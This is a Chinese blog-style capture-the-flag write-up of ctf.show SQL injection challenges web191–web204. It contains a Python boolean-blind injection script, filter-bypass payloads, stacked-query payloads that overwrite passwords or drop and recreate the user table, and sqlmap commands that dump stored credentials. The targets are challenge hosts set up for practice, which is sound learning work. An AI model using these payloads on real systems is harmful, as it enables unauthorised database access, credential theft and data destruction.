@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web191-web213SQL注入篇（二）</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/07/12 23:27:29</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <h1 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h1><p>跟上题一样，由于换了一章，就重新叙述一下。<br>布尔盲注需要先找到一个可改变的注入点。<br>比如：</p>
+<ul>
+<li><code>admin&#39; and 0#</code>时返回的是用户名不存在</li>
+<li><code>admin&#39; and 1#</code>返回的是密码错误</li>
+</ul>
+<p>由此编写脚本：这题还是用是190的脚本即可<br>直接使用paayload：</p>
+<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
+&quot;&quot;&quot;
+@File    :   SQL布尔盲注2.py   
+@Contact :   2997453446@qq.com
+@Blog    :   natro92.github.io
+ 
+@Modify Time      @Author    @Version    @Desciption
+------------      -------    --------    -----------
+2023&#x2F;7&#x2F;11 22:02   natro92      1.0         None
+&quot;&quot;&quot;
+import string
+import requests
+import time
+
+
+url &#x3D; r&#39;http:&#x2F;&#x2F;cc8108f9-dbcc-44a5-aba7-90536cd74d69.challenge.ctf.show&#x2F;api&#x2F;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;
+# payload &#x3D; &quot;admin&#39;and+if(substr(database(),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+# payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+res &#x3D; &#39;&#39;
+
+for i in range(1,100):
+    for j in str1:
+        data &#x3D; &#123;
+            &#39;username&#39;: payload.format(i, j),
+            &#39;password&#39;: &#39;0&#39;
+        &#125;
+        r &#x3D; requests.post(url, data&#x3D;data)
+        # print(data)
+        # print(r.json()[&#39;msg&#39;])
+        if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:
+            res +&#x3D; j
+            print(res)
+            break
+            time.sleep(0.3)
+        if j &#x3D;&#x3D; &#39;&#125;&#39;:
+            exit()</code></pre>
+<h1 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h1><pre class="language-python" data-language="python"><code class="language-python">&#x2F;&#x2F;TODO:感觉少了个啥，奇怪
+    if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex&#x2F;i&#39;, $username))&#123;
+        $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;
+        die(json_encode($ret));
+    &#125;</code></pre>
+<p>可惜对我没用，我这里没用ascii做，前面几个可以结合ascii和二分法结合查找，wp写的很巧妙。<br>比如：<code>if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)</code><br>还是使用上题的脚本。</p>
+<h1 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h1><h3 id="substr过滤可以使用mid、left、right来代替"><a href="#substr过滤可以使用mid、left、right来代替" class="headerlink" title="substr过滤可以使用mid、left、right来代替"></a>substr过滤可以使用mid、left、right来代替</h3><p>把substr过滤了，根据网上所说，可以用这几个来实现相同操作：<br>先来介绍一下几个函数用法，以下由gpt输出。</p>
+<ol>
+<li>MID函数：<ul>
+<li>MID(string, start, length)：从指定的字符串中提取一个子字符串。它接受三个参数：<ul>
+<li>string：要提取子字符串的源字符串。</li>
+<li>start：指定要开始提取的位置的索引。索引从1开始。</li>
+<li>length：指定要提取的子字符串的长度。</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>例如，假设有一个字符串’Hello, World!’，你可以使用MID函数提取其中的子字符串，如下所示：</li>
+</ol>
+<ul>
+<li>MID(‘Hello, World!’, 1, 5)：提取从索引位置1开始的5个字符，结果为’Hello’。</li>
+</ul>
+</li>
+<li>LEFT函数：<ul>
+<li>LEFT(string, length)：从指定的字符串的开头提取一个子字符串。它接受两个参数：<ul>
+<li>string：要提取子字符串的源字符串。</li>
+<li>length：指定要提取的子字符串的长度。</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>例如，假设有一个字符串’Hello, World!’，你可以使用LEFT函数提取其中的子字符串，如下所示：</li>
+</ol>
+<ul>
+<li>LEFT(‘Hello, World!’, 5)：提取开头的5个字符，结果为’Hello’。</li>
+</ul>
+</li>
+<li>RIGHT函数：<ul>
+<li>RIGHT(string, length)：从指定的字符串的末尾提取一个子字符串。它接受两个参数：<ul>
+<li>string：要提取子字符串的源字符串。</li>
+<li>length：指定要提取的子字符串的长度。</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>例如，假设有一个字符串’Hello, World!’，你可以使用RIGHT函数提取其中的子字符串，如下所示：</li>
+</ol>
+<ul>
+<li>RIGHT(‘Hello, World!’, 6)：提取末尾的6个字符，结果为’World!’。</li>
+</ul>
+</li>
+</ol>
+<p>这里用mid即可，稍作修改脚本：</p>
+<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
+&quot;&quot;&quot;
+@File    :   SQL布尔盲注2.py   
+@Contact :   2997453446@qq.com
+@Blog    :   natro92.github.io
+ 
+@Modify Time      @Author    @Version    @Desciption
+------------      -------    --------    -----------
+2023&#x2F;7&#x2F;11 22:02   natro92      1.0         None
+&quot;&quot;&quot;
+import string
+import requests
+import time
+
+
+url &#x3D; r&#39;http:&#x2F;&#x2F;b40c977f-1bc2-4d31-97ee-da13510260aa.challenge.ctf.show&#x2F;api&#x2F;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;
+# payload &#x3D; &quot;admin&#39;and+if(mid(database(),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+# payload &#x3D; &quot;admin&#39;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+# payload &#x3D; &quot;admin&#39;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+payload &#x3D; &quot;admin&#39;and+if(mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+res &#x3D; &#39;&#39;
+
+for i in range(1,100):
+    for j in str1:
+        data &#x3D; &#123;
+            &#39;username&#39;: payload.format(i, j),
+            &#39;password&#39;: &#39;0&#39;
+        &#125;
+        r &#x3D; requests.post(url, data&#x3D;data)
+        # print(data)
+        # print(r.json()[&#39;msg&#39;])
+        if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:
+            res +&#x3D; j
+            print(res)
+            break
+            time.sleep(0.3)
+        if j &#x3D;&#x3D; &#39;&#125;&#39;:
+            exit()</code></pre>
+<p>但是这里还是简单提一下left和right这里的写法：<br>right<br>从右边开始截取,配合ascii使用.<br>ascii(‘str’)返回字符串的第一个字符的ascii码<br>ascii(right(‘abc’,2))&#x3D; 97相当于 ascii(‘bc’)&#x3D;97<br>left<br>从左边开始截取,用reverse反转<br>ascii(reverse(left(‘abc’,2))) &#x3D; 97 相当于 ascii(‘bc’)&#x3D;97<br>mid和strsub效果一样,代码同上<br>这是一种解法，还可以：</p>
+<pre class="language-python" data-language="python"><code class="language-python">admin&#39;and ((left((select database()),&#123;&#125;)&#x3D;&#39;&#123;&#125;&#39;))#</code></pre>
+<h1 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h1><p>left和right被滤掉了<br>还能用mid。<br>上题相同脚本即可。</p>
+<h1 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h1><h3 id="堆叠注入-a-0匹配所有开头不是数字或者为0的字符串和数字"><a href="#堆叠注入-a-0匹配所有开头不是数字或者为0的字符串和数字" class="headerlink" title="堆叠注入 a&#x3D;0匹配所有开头不是数字或者为0的字符串和数字"></a>堆叠注入 <strong>a&#x3D;0匹配所有开头不是数字或者为0的字符串和数字</strong></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p>
+</blockquote>
+<p>什么是堆叠注入，我一听这名字也懵了一下，查了一下，就是末尾加<code>；</code>链接下一个命令语句。使其一起执行。<br>空格被过滤了，可以用反引号执行。<br>题目里提示说登陆成功即可得到flag，那么将数据的密码切换为自己的密码即可。</p>
+<pre class="language-python" data-language="python"><code class="language-python">if($row[0]&#x3D;&#x3D;$password)&#123;
+      $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;
+  &#125;</code></pre>
+<p>由于sql的知识就是一坨，还是先查了一下写法：</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">UPDATE table_name
+SET column1 &#x3D; value1, column2 &#x3D; value2, ...
+WHERE condition;</code></pre>
+<p>因此可以写出payload:</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;1;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1&amp;password&#x3D;1
+然后上传
+username&#x3D;0&amp;password&#x3D;1</code></pre>
+<p>就会返回flag。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689160962992-9e51c7f1-4f6c-428c-ba4f-5a04d65443df.png" alt="image.png"><br><strong>（username&#x3D;0这个做法在web188中有提到，就是匹配所有开头不是数字或者为0的字符串和数字0）</strong><br>或者，还可以：</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">0x61646d696e;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;123456
+然后账号0x61646d696e和密码123456</code></pre>
+<h1 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h1><p>限制了用户名长度。看了wp才发现，这里的select没被过滤。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689163102786-54c21ea0-9ae6-4f5c-bb7d-81ba8af98594.png" alt="image.png"><br>啊这<br>payload：<code>username=1;select(1)&amp;password=1</code>让select的值覆盖给需要比对的参数，然后再传入你需要的密码。</p>
+<h1 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h1><h3 id="show-tables查看表名-drop-create删表和创建表-insert插入数据"><a href="#show-tables查看表名-drop-create删表和创建表-insert插入数据" class="headerlink" title="show tables查看表名 drop\create删表和创建表 insert插入数据"></a>show tables查看表名 drop\create删表和创建表 insert插入数据</h3><h2 id="方法一-show-tables"><a href="#方法一-show-tables" class="headerlink" title="方法一 show tables"></a>方法一 show tables</h2><p>show tables获取表名的结果集。<br>由题目可知，ctfshow_user在其中，我们只需要这样传值即可</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;1;show tables&amp;password&#x3D;ctfshow_user</code></pre>
+<h2 id="方法二-删表-把他变成自己的样子"><a href="#方法二-删表-把他变成自己的样子" class="headerlink" title="方法二 删表 把他变成自己的样子"></a>方法二 删表 把他变成自己的样子</h2><pre class="language-sql" data-language="sql"><code class="language-sql">0;drop table ctfshow_user;create table ctfshow_user(&#96;username&#96; varchar(100),&#96;pass&#96; varchar(100));insert ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(1,1)</code></pre>
+<p>然后直接账号密码输入1和1即可<br>当然也可以直接insert插入：</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">username:0;insert  ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(0,0);
+password:0</code></pre>
+<h2 id="SQL知识补充-drop、create、insert"><a href="#SQL知识补充-drop、create、insert" class="headerlink" title="SQL知识补充-drop、create、insert"></a>SQL知识补充-drop、create、insert</h2><pre class="language-sql" data-language="sql"><code class="language-sql">DROP OBJECT_TYPE [IF EXISTS] object_name;
+
+- &#96;OBJECT_TYPE&#96;：指定要删除的对象类型，如&#96;TABLE&#96;（表）、&#96;VIEW&#96;（视图）等。
+- &#96;IF EXISTS&#96;（可选）：如果加上此选项，如果要删除的对象不存在，则不会引发错误。
+- &#96;object_name&#96;：指定要删除的对象的名称。</code></pre>
+<pre class="language-sql" data-language="sql"><code class="language-sql">CREATE OBJECT_TYPE object_name
+(
+    column1 data_type,
+    column2 data_type,
+    ...
+);
+
+
+- &#96;OBJECT_TYPE&#96;：指定要创建的对象类型，如&#96;TABLE&#96;（表）、&#96;VIEW&#96;（视图）等。
+- &#96;object_name&#96;：指定要创建的对象的名称。
+- &#96;column1 data_type, column2 data_type, ...&#96;：指定对象的列及其数据类型。</code></pre>
+<pre class="language-sql" data-language="sql"><code class="language-sql">INSERT INTO table_name (column1, column2, ...)
+VALUES (value1, value2, ...);
+
+- &#96;table_name&#96;：指定要插入数据的表的名称。
+- &#96;column1, column2, ...&#96;：指定要插入数据的列。
+- &#96;value1, value2, ...&#96;：指定要插入的值，与列一一对应。</code></pre>
+<h1 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h1><p>继续用上题的insert插入即可。</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">username:0;insert  ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(0,0);
+password:0</code></pre>
+<h1 id="web199、web200"><a href="#web199、web200" class="headerlink" title="web199、web200"></a>web199、web200</h1><p>括号被禁用了，那就用那个show tables</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">0;show tables
+
+ctfshow_user</code></pre>
+<h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><h3 id="sqlmapGET注入-referer"><a href="#sqlmapGET注入-referer" class="headerlink" title="sqlmapGET注入 referer"></a>sqlmapGET注入 referer</h3><pre class="language-sql" data-language="sql"><code class="language-sql">当前数据库
+参数：--current-db
+返还当前连接的数据库。
+
+列举数据库表
+参数：--tables,--exclude-sysdbs,-D
+当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。
+如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。
+--exclude-sysdbs参数是指包含了所有的系统数据库。
+需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。
+
+列举数据库表中的字段
+参数：--columns,-C,-T,-D
+当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。
+如果没有使用-D参数指定数据库时，默认会使用当前数据库。
+
+获取整个表的数据
+参数：--dump,-C,-T,-D,--start,--stop,--first,--last
+如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。
+使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。</code></pre>
+<p>payload：<code>sqlmap -u http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/api/\?id\=1 --refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php</code><br>返回出：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166554462-4a3c7438-52d5-4b6d-b87d-910192d93e48.png" alt="image.png"><br>然后用payload爆表爆词条<br>爆库：</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap -u http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;api&#x2F;\?id\&#x3D;1 --refer&#x3D;http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;sqlmap.php</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166695514-becf0b5a-ebd9-4e7f-a93f-08e61f61a372.png" alt="image.png"><br>爆表：</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap -u http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;api&#x2F;\?id\&#x3D;1 --refer&#x3D;http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;sqlmap.php -D ctfshow_web --tables</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166764719-0fee533f-e0a8-4971-bd2d-a8ea49d132f4.png" alt="image.png"><br>爆词条</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap -u http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;api&#x2F;\?id\&#x3D;1 --refer&#x3D;http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;sqlmap.php -D ctfshow_web -T ctfshow_user --columns</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166806079-e9066b90-185d-4eee-a837-3c79ea26c08c.png" alt="image.png"><br>查看字段</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap -u http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;api&#x2F;\?id\&#x3D;1 --refer&#x3D;http:&#x2F;&#x2F;6859defc-0622-4162
+-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;sqlmap.php -D ctfshow_web -T ctfshow_user -C id,pass,username --dump</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166915916-68f13c0c-13e8-47fd-90f4-fe5f87d32ff1.png" alt="image.png"></p>
+<h1 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h1><h3 id="sqlmapPOST注入-注意–referer和–data"><a href="#sqlmapPOST注入-注意–referer和–data" class="headerlink" title="sqlmapPOST注入 注意–referer和–data"></a>sqlmapPOST注入 注意–referer和–data</h3><p>抓包用的虽然是get，但是提示说是用post传参。<br>那就用post试一下。<br>我不理解这个referer的ctf.show是怎么确定的。</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap -u http:&#x2F;&#x2F;c3420367-21b9-4692-8570-1ac73fb7a651.challenge.ctf.show&#x2F;api&#x2F; --data&#x3D;&#39;id&#x3D;1&#39; --refer&#x3D;&#39;ctf.show&#39; --dbs</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;c3420367-21b9-4692-8570-1ac73fb7a651.challenge.ctf.show&#x2F;api&#x2F; --data&#x3D;&#39;id&#x3D;1&#39; --referer&#x3D;&#39;ctf.show&#39; -D ctfshow_web -T ctfshow_user -C id,pass,username --dump</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689168116809-aecb017b-30da-4d98-8cf2-62ae2e821ebf.png" alt="image.png"></p>
+<h1 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h1><h3 id="–method-切换方式-PUT请求"><a href="#–method-切换方式-PUT请求" class="headerlink" title="–method 切换方式 PUT请求"></a>–method 切换方式 PUT请求</h3><p>提示–method切换方式，使用PUT方法，需要加上Content-Type头，否则会变成表单提交：<br>我真的不太理解，这里为什么相同参数 我的就不行，wp的就可以：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;3c00342b-19a7-4a23-aa48-e84c36c5bcef.challenge.ctf.show&#x2F;api&#x2F;index.php --refer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1
+&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C id,pass,username --dump</code></pre>
+<h2 id="PUT请求"><a href="#PUT请求" class="headerlink" title="PUT请求"></a>PUT请求</h2><p>PUT请求的工作原理如下：</p>
+<ol>
+<li>客户端发送PUT请求到服务器，并指定要更新的资源的URI（统一资源标识符）。</li>
+<li>服务器收到PUT请求后，会检查请求头中的Content-Type字段来确定接收的数据格式。</li>
+<li>服务器根据请求中提供的数据更新对应的资源。如果资源不存在，服务器可能会根据请求中的数据创建新的资源。</li>
+<li>服务器返回HTTP响应码，指示PUT请求的处理结果。</li>
+</ol>
+<h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><h3 id="–cookie"><a href="#–cookie" class="headerlink" title="–cookie"></a>–cookie</h3><p>先抓包获取cookie参数：<br><code>PHPSESSID=5mb3tupsgnxxxxxx; ctfshow=07cxxxxxxxxx</code><br>然后构建payload</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;087527a8-18dc-4e85-984e-4f9a39590671.challenge.ctf.show&#x2F;api&#x2F;index.php --refer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;5mb3xxxxq7ajmjalma2rc; ctfshow&#x3D;07cdfa7549bc3cxxx9edxxxxxxea&quot; -D ctfshow_web -T ctfshow_user -C id,pass,username --dump</code></pre>
